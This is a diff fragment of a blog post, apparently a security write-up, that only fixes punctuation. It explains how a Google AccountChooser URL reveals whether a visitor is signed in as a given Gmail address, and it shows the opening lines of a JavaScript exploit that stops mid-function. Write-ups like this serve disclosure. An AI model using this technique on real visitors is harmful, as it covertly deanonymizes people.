@@ -19,7 +19,7 @@ First, we get the URI of any embeddable resource hosted on "[*.google.com](#)"; 
 {% highlight css linenos %}
 https://accounts.google.com/AccountChooser?continue=https://www.google.com/images/errors/robot.png&email=target@gmail.com
 {% endhighlight %}
-Now, we have an endpoint that points to an image resource when the email address of the current Gmail user is "`target@gmail.com`", but points to a webpage otherwise! Cool, here's a sweet exploit:
+Now, we have an endpoint that points to an image resource when the email address of the current Gmail user is "`target@gmail.com`" but points to a webpage otherwise! Cool, here's a sweet exploit:
 {% highlight javascript linenos %}
 (function (email) {
     var endpoint = 'https://accounts.google.com/AccountChooser?continue=https://www.google.com/images/errors/robot.png&email=';
